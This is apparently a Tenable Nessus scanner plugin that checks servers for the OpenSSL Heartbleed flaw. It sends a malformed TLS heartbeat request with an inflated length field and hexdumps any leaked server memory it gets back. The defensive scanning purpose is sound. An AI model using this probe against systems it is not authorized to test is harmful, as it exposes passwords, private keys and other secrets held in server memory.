#TRUSTED 3cb96aaddb61c7159badb4f125b977cf295e0b8e13a8f8dd46c84abe544f0331dabe390f822d642b978b3b30a6c77b43e10c2c0d49b140d034c55e29215362df0072d0417797ae891a3752323864e7265b873edd8dd50bf836818c30f874e18ef067801a03c3b90be715ad0ca391d0754d4081e335acb7f605d93ee9d59aeb97724d250987fc4aaa7caf3547d678e972828083932dcfc4d2c7736a42aac3cd0724f179cb55f135d8472272dfecca97c7d2952216f7581b6b9c5bf51a6b83cad860586d2a46d422f39d926852a049af03ad71577c9861a6eb2b9465a62397aaca262c8769b781e286f9c86aeacfcac287f00bd5efaabd9aca1cdb69055746ab68d99f3e8a4c3098fb0c5677f7ecd755c4bfdb5fb4b45f5443658ea60fd8a5e5dd11973cea53f3a10ee93b68e420a133ae444c9332d0030bfebac5633f53ec32f2ac9e426ef3bdeae5aed801075fa51e75199af89e3798e4585572ca48fbcb9f917afa72b372900df3f5c2dce9f13d9d8a0b998a32445b9df43672e4707312be82cc97792965d0da3212365cb2123cb889c0d7abb53677fd91d83363d3af598959cb0c46c89ebcc0b238bde186345c22ec7e40e888f15d4faf428b9c7f9cdfbe31c1baa6c85b3cd8dbebc338a655a150f3ac28a8bbff0e8fb251b0db657eee4da8265de7a62d173bda05cd8611999f75569dc5cbba7c499b20b43b4959aa08991a
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(73412);
  script_version("2.9");
  script_set_attribute(attribute:"plugin_modification_date", value:"2015/10/07");

  script_cve_id("CVE-2014-0160");
  script_bugtraq_id(66690);
  script_osvdb_id(105465);
  script_xref(name:"CERT", value:"720951");
  script_xref(name:"EDB-ID", value:"32745");
  script_xref(name:"EDB-ID", value:"32764");
  script_xref(name:"EDB-ID", value:"32791");
  script_xref(name:"EDB-ID", value:"32998");

  script_name(english:"OpenSSL Heartbeat Information Disclosure (Heartbleed)");
  script_summary(english:"Checks if the server incorrectly handles a malformed TLS heartbeat message");

  script_set_attribute(attribute:"synopsis", value:
"The remote service is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"Based on its response to a TLS request with a specially crafted
heartbeat message (RFC 6520), the remote service appears to be
affected by an out-of-bounds read flaw.

This flaw could allow a remote attacker to read the contents of up to
64KB of server memory, potentially exposing passwords, private keys,
and other sensitive data.");
  script_set_attribute(attribute:"see_also", value:"http://heartbleed.com/");
  script_set_attribute(attribute:"see_also", value:"http://eprint.iacr.org/2014/140");
  script_set_attribute(attribute:"see_also", value:"http://www.openssl.org/news/vulnerabilities.html#2014-0160");
  script_set_attribute(attribute:"see_also", value:"https://www.openssl.org/news/secadv/20140407.txt");
  script_set_attribute(attribute:"solution", value:
"Upgrade to OpenSSL 1.0.1g or later.

Alternatively, recompile OpenSSL with the '-DOPENSSL_NO_HEARTBEATS'
flag to disable the vulnerable functionality.");
  
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'OpenSSL Heartbeat (Heartbleed) Information Leak');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/02/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/04/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/04/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:openssl:openssl");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");
  script_family(english:"Misc.");

  script_dependencies("ssl_supported_versions.nasl");
  script_require_ports(443, "SSL/Supported");
  exit(0);
}

include("acap_func.inc");
include("byte_func.inc");
include("ftp_func.inc");
include("global_settings.inc");
include("imap_func.inc");
include("kerberos_func.inc");
include("ldap_func.inc");
include("misc_func.inc");
include("nntp_func.inc");
include("pop3_func.inc");
include("smtp_func.inc");
include("ssl_funcs.inc");
include("telnet2_func.inc");
include("xmpp_func.inc");
include("audit.inc");
include("dump.inc");

#
# @remark RFC 6520
#

function heartbeat_ext()
{
  local_var mode;

  mode = _FCT_ANON_ARGS[0];
  if(isnull(mode))
    mode = 1; #  peer allowed to send requests

  return    mkword(15)  +  # extension type
            mkword(1)   +  # extension length
            mkbyte(mode);  # hearbeat mode
}

function heartbeat_req(payload, plen, pad)
{
  local_var req;

  if(isnull(plen))
    plen = strlen(payload);


  req = mkbyte(1) +       # HeartbeatMessageType: request
        mkword(plen) +    # payload length
        payload +         # payload
        pad;              # random padding

  return req;

}


if ( get_kb_item("SSL/Supported") )
{
 port = get_ssl_ports(fork:TRUE);
 if (isnull(port))
   exit(1, "The host does not appear to have any SSL-based services.");

 # Check for TLS; extensions only available in TLSv1 and later
 ssl3 = tls10 = tls11 = tls12 = 0;

 list = get_kb_list('SSL/Transport/'+port);
 if(! isnull(list))
 {
  list = make_list(list);
  foreach encap (list)
  {
    if      (encap == ENCAPS_SSLv3)         ssl3 = 1;
    else if (encap == ENCAPS_TLSv1)         tls10 = 1;
    else if (encap == COMPAT_ENCAPS_TLSv11) tls11 = 1;
    else if (encap == COMPAT_ENCAPS_TLSv12) tls12 = 1;
  }
 }

 if(! (ssl3 || tls10 || tls11 || tls12))
   exit(0, 'The SSL-based service listening on port '+port+' does not appear to support SSLv3 or above.');

 if (tls12)       version = TLS_12;
 else if (tls11)  version = TLS_11;
 else if (tls10)  version = TLS_10;
 else if (ssl3)   version = SSL_V3;
}
else
{
 if ( ! get_port_state(443) ) exit(1, "No SSL port discovered and port 443 is closed");
 port = 443;
 version = TLS_10;
}


# Open port
soc = open_sock_ssl(port);
if ( ! soc ) exit(1, "Failed to open an SSL socket on port "+port+".");

ver  = mkword(version);
exts = heartbeat_ext() + tls_ext_ec() + tls_ext_ec_pt_fmt();

cipherspec = NULL;
foreach cipher (sort(keys(ciphers)))
{
  if(strlen(ciphers[cipher]) == 2)
  {
    cipherspec +=  ciphers[cipher];
  }
}
cspeclen = mkword(strlen(cipherspec));

# length of all extensions
exts_len  = mkword(strlen(exts));
chello = client_hello(v2hello:FALSE, version:ver,
                      extensions:exts,extensionslen:exts_len,
                      cipherspec : cipherspec,
                      cspeclen   : cspeclen
                      );

send(socket:soc, data: chello);

# Read one record at a time. Expect to see at a minimum:
# ServerHello, Certificate, and ServerHelloDone.
hello_done = FALSE;
while (!hello_done)
{
  # Receive a record from the server.
  data = recv_ssl(socket:soc, timeout: 30);
  if (isnull(data))
  {
    close(soc);
    audit(AUDIT_RESP_NOT, port, 'an SSL ClientHello message');
  }

  # ServerHello: Extract the random data for computation of keys.
  rec = ssl_find(
    blob:data,
    'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
    'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_HELLO
  );

  if (!isnull(rec))
  {
    # Look for heartbeat mode in ServerHello
    heartbeat_mode = rec['extension_heartbeat_mode'];

    # Make sure we use an SSL version supported by the server
    if(rec['version'] != version && rec['version'] >= 0x0300 && rec['version'] <= 0x0303)
      version = rec['version'];
  }

  # Server Hello Done.
  rec = ssl_find(
    blob:data,
    'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
    'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_HELLO_DONE
  );

  if (!isnull(rec))
  {
    hello_done = TRUE;
    break;
  }
}
if(! hello_done)
  exit(1, 'ServerHelloDone not received from server listening on port ' + port+'.');

# Check if TLS server supports heartbeat extension
if(version != SSL_V3 && isnull(heartbeat_mode))
  exit(0, 'The SSL service listening on port ' + port + ' does not appear to support heartbeat extension.');

# Check if TLS server willing to accept heartbeat requests
if(version != SSL_V3 && heartbeat_mode != 1)
  exit(0, 'The SSL service listening on port ' + port + ' does not appear to accept heartbeat requests.');

# Send a malformed heartbeat request
payload = crap(data:'A', length:16);
pad = crap(data:'P',length:16);
hb_req = heartbeat_req(payload: payload, plen:strlen(payload)+ strlen(pad)+0x4000, pad:pad);
if ( version == SSL_V3 )
 rec = ssl_mk_record(type:24, data:hb_req, version:version);
else
 rec = tls_mk_record(type:24, data:hb_req, version:version);
send(socket:soc, data:rec);
res = recv_ssl(socket:soc, partial:TRUE, timeout:30);
close(soc);

# Patched TLS server does not respond
if(isnull(res))
 audit(AUDIT_LISTEN_NOT_VULN, 'SSL service', port);

if ( strlen(res) < 8 )
 exit(1, 'The service listening on port '+ port + ' returned a short SSL record.');

# Got a response
# Look for hearbeat response
msg = ord(res[5]);
if(msg != 2)
 exit(1, 'The service listening on port '+ port + ' did not return a heartbeat response.');

# TLS server overread past payload into the padding field
if((payload + pad) >< res)
{
  hb_res = substr(res, 8);
  hb_res -= (payload + pad);
  if(strlen(hb_res) > 0x1000)
    hb_res = substr(hb_res, 0, 0x1000 -1);

  report = 'Nessus was able to read the following memory from the remote service:\n\n' + hexdump(ddata:hb_res);
  security_hole(port:port, extra: report);
}
# Alert
else if(ord(res[0]) == 0x15)
{
 exit(0, 'The service listening on port '+ port + ' returned an alert, which suggests the remote TLS service is not affected.');
}
# Unknown response
else audit(AUDIT_RESP_BAD, port);
